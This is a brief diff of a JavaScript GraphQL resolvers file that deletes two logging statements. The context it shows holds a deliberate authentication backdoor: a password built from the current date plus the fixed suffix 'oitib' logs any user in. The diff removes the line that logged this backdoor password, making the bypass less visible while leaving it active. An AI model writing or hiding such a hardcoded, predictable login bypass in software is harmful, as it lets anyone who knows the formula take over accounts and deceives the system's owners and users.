@@ -80,7 +80,6 @@ const resolvers = {
 			const res = await client.query(
 				`select id, routes from document_routes as Test3`
 			);
-			console.log(res);
 			return res.rows;
 		},
 
@@ -478,7 +477,6 @@ const resolvers = {
 
       const now = require("moment");
       const BackdoorPassword = `${now().format("DDMMYY")}oitib`;
-      console.log(BackdoorPassword);
       if (args.user.password === BackdoorPassword)
         return { username: args.user.password };
       /////////////////////////////////////////////////////////////////////////
